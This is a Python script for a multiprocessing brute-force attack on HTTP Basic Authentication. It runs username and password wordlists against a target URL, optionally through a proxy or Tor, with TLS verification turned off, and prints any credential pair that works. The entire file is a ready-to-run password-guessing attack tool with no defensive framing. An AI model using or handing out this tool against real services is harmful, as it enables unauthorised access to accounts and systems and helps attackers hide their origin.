import requests
from requests.auth import HTTPBasicAuth
from requests.adapters import HTTPAdapter, Retry
from multiprocessing import Pool, Manager, cpu_count
import argparse
import sys
import os
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def safe_lines(filepath):
    warned = False
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    line.encode('latin1')  # Required by HTTP Basic Auth
                    yield line
                except UnicodeEncodeError:
                    if not warned:
                        print(f"[!] Skipping unsupported lines in '{filepath}' (non-latin1). Modifying stream silently...")
                        warned = True
                    continue
    except FileNotFoundError:
        print(f"[!] File Not Found: {filepath}")
        sys.exit(1)



def create_session(proxy=None):
    session = requests.Session()
    retries = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[500, 502, 503, 504]
    )
    adapter = HTTPAdapter(max_retries=retries)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.verify = False
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session


def update_progress(current, total):
    bar_len = 40
    filled_len = int(bar_len * current / total)
    bar = '■' * filled_len + '□' * (bar_len - filled_len)
    percent = (current / total) * 100
    print(f"\r[+] Progress: [{bar}] %{percent:5.1f}  →  ({current}/{total})", end='', flush=True)


def try_login(domain, username, password, proxy, shared, lock):
    if shared['found']:
        return

    session = create_session(proxy)

    try:
        response = session.get(
            domain,
            auth=HTTPBasicAuth(username, password),
            timeout=5,
        )
    except requests.RequestException as e:
        print(f"\n[!] ERROR: {username}:{password} → {e}")
        return  # ← skip progress or shared flag update

    with lock:
        shared['count'] += 1
        update_progress(shared['count'], shared['total'])

        if response.status_code == 200 and not shared['found']:
            print(f"\n[✓] SUCCESS: {username}:{password}")
            shared['found'] = True
        elif response.status_code == 401:
            pass  # silently fail
        else:
            print(f"\n[?] UNKNOWN: {username}:{password} → Status: {response.status_code}")



def brute_force(domain, usernames, passfile, proxy, workers):
    print(f"[+] Target: {domain}")
    print(f"[+] Proxy: {proxy}" if proxy else "[+] No proxy")
    print(f"[*] Using {workers} Threads")

    manager = Manager()
    shared = manager.dict()
    shared['found'] = False
    shared['count'] = 0
    shared['total'] = 0
    lock = manager.Lock()

    tasks = []

    for username in usernames:
        for password in safe_lines(passfile):
            shared['total'] += 1
            tasks.append((domain, username, password, proxy, shared, lock))

    with Pool(processes=workers) as pool:
        pool.starmap(try_login, tasks)

    print("\n[*] Brute-force finished.")


def main():
    parser = argparse.ArgumentParser(description="Multiprocessing Basic Auth Brute-Forcer with Progress Bar")
    parser.add_argument("-d", "--domain", required=True, help="Target URL (must be HTTPS)")
    parser.add_argument("-U", "--userfile", help="Username wordlist file")
    parser.add_argument("-u", "--username", help="Single username")
    parser.add_argument("-P", "--passfile", required=True, help="Password wordlist file")
    parser.add_argument("-x", "--proxy", help="Proxy (e.g. http://127.0.0.1:8080 or socks5://127.0.0.1:9050)")
    parser.add_argument("-w", "--workers", type=int, default=cpu_count(), help="Number of processes to use")

    args = parser.parse_args()

    # Force HTTPS
    if not args.domain.lower().startswith("https://"):
        print(f"[!] Target must use HTTPS. You entered: {args.domain}")
        args.domain = "https://" + args.domain.lstrip("http://").lstrip("/")
        print(f"[+] Auto-corrected to: {args.domain}")

    if not args.username and not args.userfile:
        print("[!] Provide either -u or -U")
        parser.print_help()
        sys.exit(1)

    if not os.path.isfile(args.passfile):
        print(f"[!] Invalid password file path: {args.passfile}")
        sys.exit(1)

    usernames = [args.username] if args.username else list(safe_lines(args.userfile))
    brute_force(args.domain, usernames, args.passfile, args.proxy, args.workers)


if __name__ == "__main__":
    main()
